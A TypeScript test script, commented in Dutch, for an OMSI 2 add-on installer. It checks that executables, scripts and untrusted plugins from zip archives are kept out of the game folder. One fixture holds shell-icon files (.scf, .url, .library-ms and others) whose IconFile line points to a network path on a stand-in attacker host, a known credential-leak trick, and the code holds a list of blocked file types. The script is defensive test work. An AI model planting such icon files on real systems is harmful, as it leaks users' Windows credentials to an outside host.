/**
 * Programmacode: gaat een plugin stil mee, en komt een .exe ooit in OMSI?
 *
 *   npx tsx scripts/probe-programmacode.ts    (PROEF_MAP=<map> voor een eigen werkmap)
 *
 * Een zip met een bus, een plugin (.dll met .opl en .ini), een plugin via een
 * map `plugins`, en programma's en scripts (setup.exe, installeer.bat,
 * start.ps1, Omsi.exe). Eerst installeren zonder het vinkje "ik vertrouw de
 * maker": de bus en de .ini komen erin, geen .dll of .opl, en geen enkel
 * programma. Dan een tweede keer met het vinkje: de plugins erbij, de
 * programma's nog steeds niet.
 *
 * (29-09) Daarna een zip met snelkoppelingen en bestanden waarvan de
 * verkenner zelf een pictogram ophaalt, ook van een netwerkpad (`.url`,
 * `.scf`, `.library-ms`, `.searchConnector-ms`, `.website`), en een `.jar`:
 * ook met het vinkje komt daar niets van in OMSI.
 *
 * Op de oude code (vóór 28-09) faalt dit: `plugins/ander.dll` ging stil mee
 * en `setup.exe` kwam in de busmap. Het laatste deel faalt op d9eeeda: de
 * `.scf`, `.url` en `.library-ms` kwamen in `Vehicles/MijnBus/script/`.
 */
import { existsSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { installeerStappen, loopAf, openBron, planStappen, verwijderStappen, type Plan } from '../src/core/addon'
import { allesOnder, einde, klopt, maakZip, nepOmsi, proefMap } from './proefhulp'

const basis = proefMap('programmacode')
const omsi = nepOmsi(basis)
const data = join(basis, 'userdata')
const zip = join(basis, 'Bus met plugin.zip')
maakZip(zip, [
  { naam: 'Bus met plugin/MijnBus/mijn.bus', inhoud: '[friendlyname]\nMijn bus\n' },
  { naam: 'Bus met plugin/MijnBus/setup.exe', inhoud: 'MZ' },
  { naam: 'Bus met plugin/MijnBus/installeer.bat', inhoud: '@echo off' },
  { naam: 'Bus met plugin/MijnBus/script/start.ps1', inhoud: 'Write-Host' },
  { naam: 'Bus met plugin/MijnPlugin/MijnPlugin.dll', inhoud: 'MZ-dll' },
  { naam: 'Bus met plugin/MijnPlugin/MijnPlugin.opl', inhoud: '[dll]\nMijnPlugin.dll\n' },
  { naam: 'Bus met plugin/MijnPlugin/MijnPlugin.ini', inhoud: 'stand=1' },
  { naam: 'Bus met plugin/OMSI 2/plugins/ander.dll', inhoud: 'MZ-ander' },
  { naam: 'Bus met plugin/OMSI 2/Omsi.exe', inhoud: 'MZ-nep-omsi' }
])

const bron = openBron(zip)
const plan = loopAf(planStappen(bron, omsi, { addons: [] }))
const code = (plan.code ?? []).map((r) => r.doel).sort()
klopt(`plan: de plugins apart (${code.join(', ')})`, code.join('|') === 'plugins/MijnPlugin.dll|plugins/MijnPlugin.opl|plugins/ander.dll')
klopt('plan: geen .dll of .opl bij de gewone regels', !plan.regels.some((r) => /\.(dll|opl)$/i.test(r.doel)))
const nooit = (plan.nooit ?? []).slice().sort()
klopt(`plan: vier programma's nooit (${nooit.length})`, nooit.length === 4 && nooit.every((p) => /\.(exe|bat|ps1)$/i.test(p)))
klopt('plan: geen programma bij de regels', !plan.regels.some((r) => /\.(exe|bat|cmd|ps1)$/i.test(r.doel)))

// Zonder het vinkje.
const zonder = loopAf(installeerStappen(bron, plan, omsi, data, new Date(2026, 8, 28)))
let inOmsi = allesOnder(omsi)
klopt('zonder vinkje: de bus staat erin', inOmsi.includes('Vehicles/MijnBus/mijn.bus'))
klopt('zonder vinkje: de .ini van de plugin staat erin (geen code)', inOmsi.includes('plugins/MijnPlugin.ini'))
klopt(`zonder vinkje: geen .dll of .opl (${inOmsi.filter((p) => /\.(dll|opl)$/i.test(p)).join(', ') || 'geen'})`, !inOmsi.some((p) => /\.(dll|opl)$/i.test(p)))
klopt(`zonder vinkje: geen programma's (${inOmsi.filter((p) => /\.(exe|bat|ps1)$/i.test(p) && p !== 'Omsi.exe').join(', ') || 'geen'})`, !inOmsi.some((p) => /\.(exe|bat|ps1)$/i.test(p) && p !== 'Omsi.exe'))
klopt('zonder vinkje: Omsi.exe niet overschreven', existsSync(join(omsi, 'Omsi.exe')) && readFileSync(join(omsi, 'Omsi.exe')).length === 0)

// Weer weg, en dan met het vinkje.
loopAf(verwijderStappen(zonder.addon, { addons: [zonder.addon] }, omsi, data))
const plan2: Plan = loopAf(planStappen(bron, omsi, { addons: [] }))
const met = loopAf(installeerStappen(bron, plan2, omsi, data, new Date(2026, 8, 29), { metCode: true }))
bron.sluit()
inOmsi = allesOnder(omsi)
klopt(`met vinkje: de plugins erbij (${met.code ?? '?'} bestanden)`, inOmsi.includes('plugins/MijnPlugin.dll') && inOmsi.includes('plugins/MijnPlugin.opl') && inOmsi.includes('plugins/ander.dll') && met.code === 3)
klopt("met vinkje: nog steeds geen programma's", !inOmsi.some((p) => /\.(exe|bat|ps1)$/i.test(p) && p !== 'Omsi.exe'))
klopt('met vinkje: in het register staan de plugins, dus verwijderen haalt ze weer weg', met.addon.bestanden.some((b) => b.pad === 'plugins/MijnPlugin.dll'))

// ---- snelkoppelingen en wat de verkenner zelf opent ----
{
  const map = proefMap('programmacode-verkenner')
  const omsi2 = nepOmsi(map)
  const zip2 = join(map, 'Bus met snelkoppelingen.zip')
  const icoon = String.raw`[.ShellClassInfo]
IconFile=\\aanvaller\x\i.ico
`
  const RAAR = ['y.scf', 'z.url', 'w.library-ms', 'v.searchConnector-ms', 'u.website', 't.jar', 's.chm', 'r.inf']
  maakZip(zip2, [
    { naam: 'MijnBus/mijn.bus', inhoud: '[friendlyname]\nMijn bus\n' },
    { naam: 'MijnBus/script/leesmij.txt', inhoud: 'gewoon' },
    ...RAAR.map((naam) => ({ naam: `MijnBus/script/${naam}`, inhoud: icoon }))
  ])
  const bron2 = openBron(zip2)
  const plan3 = loopAf(planStappen(bron2, omsi2, { addons: [] }))
  loopAf(installeerStappen(bron2, plan3, omsi2, join(map, 'userdata'), new Date(2026, 8, 29), { metCode: true }))
  bron2.sluit()
  const neergezet = allesOnder(omsi2)
  const mis = RAAR.filter((naam) => neergezet.some((p) => p.toLowerCase().endsWith(naam.toLowerCase())))
  klopt(`verkenner: met het vinkje geen snelkoppeling of pictogrambestand in OMSI (${mis.join(', ') || 'geen'})`, mis.length === 0)
  klopt(`verkenner: ze staan in het plan bij "nooit" (${(plan3.nooit ?? []).length} van ${RAAR.length})`, (plan3.nooit ?? []).length === RAAR.length)
  klopt('verkenner: de bus en de leesmij wel', neergezet.includes('Vehicles/MijnBus/mijn.bus') && neergezet.includes('Vehicles/MijnBus/script/leesmij.txt'))
}

einde()
